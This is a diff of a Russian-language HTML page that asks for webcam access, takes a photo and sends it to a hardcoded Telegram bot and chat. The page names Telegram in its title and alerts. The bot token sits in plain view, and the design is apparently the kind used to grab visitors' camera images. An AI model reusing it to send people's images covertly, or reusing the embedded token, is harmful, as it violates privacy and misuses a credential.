@@ -1,53 +1,66 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Capture and Send</title>
+    <title>Фото с камеры и отправка в Telegram</title>
 </head>
 <body>
-    <h1>Capture Image from Webcam</h1>
-    <video id="video" width="640" height="480" autoplay></video>
-    <button id="capture">Capture Photo</button>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-    <form id="uploadForm" method="POST" enctype="multipart/form-data" action="http://vutly.great-site.net/upload.php">
-        <input type="file" id="imageFile" name="image" style="display:none;">
-        <button type="submit" id="upload">Upload Photo</button>
-    </form>
+    <h1>Запрос камеры и отправка фото в Telegram</h1>
+    <button id="start-camera">Запустить камеру</button>
+    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    <button id="take-photo" style="display:none;">Сделать фото</button>
 
     <script>
-        // Получаем доступ к видео элементу
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const captureButton = document.getElementById('capture');
-        const uploadForm = document.getElementById('uploadForm');
-        const imageFile = document.getElementById('imageFile');
+        // Функция для запроса доступа к камере
+        document.getElementById('start-camera').addEventListener('click', async function() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const takePhotoButton = document.getElementById('take-photo');
 
-        // Запрашиваем доступ к камере
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
+            try {
+                // Запрашиваем доступ к камере
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-            })
-            .catch(err => {
-                console.error("Error accessing webcam: " + err);
-            });
+                video.style.display = 'block';
+                takePhotoButton.style.display = 'block';
+            } catch (err) {
+                console.error("Ошибка доступа к камере: ", err);
+            }
+        });
 
-        // Функция для захвата изображения
-        captureButton.addEventListener('click', () => {
+        // Функция для захвата фото и отправки его в Telegram
+        document.getElementById('take-photo').addEventListener('click', function() {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
             const context = canvas.getContext('2d');
+
+            // Рисуем текущее изображение с видео на холсте
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Конвертируем изображение в Blob
-            canvas.toBlob(blob => {
-                const file = new File([blob], "webcam.jpg", { type: 'image/jpeg' });
-                
-                // Обновляем input file и отправляем форму
-                const dataTransfer = new DataTransfer();
-                dataTransfer.items.add(file);
-                imageFile.files = dataTransfer.files;
+            // Преобразуем изображение в Data URL
+            const imageDataUrl = canvas.toDataURL('image/png');
 
-                uploadForm.submit();
-            }, 'image/jpeg');
+            // Отправляем изображение в Telegram
+            fetch('https://api.telegram.org/bot7497846380:AAFqWQmUb7EytKTon3GPQaFU1hf8b27rYZI/sendPhoto', {
+                method: 'POST',
+                body: JSON.stringify({
+                    chat_id: '-4587383325',
+                    photo: imageDataUrl
+                }),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            }).then(response => {
+                if (response.ok) {
+                    alert('Фото отправлено в Telegram!');
+                } else {
+                    alert('Ошибка отправки фото в Telegram.');
+                }
+            }).catch(error => {
+                console.error('Ошибка при отправке фото: ', error);
+            });
         });
     </script>
 </body>
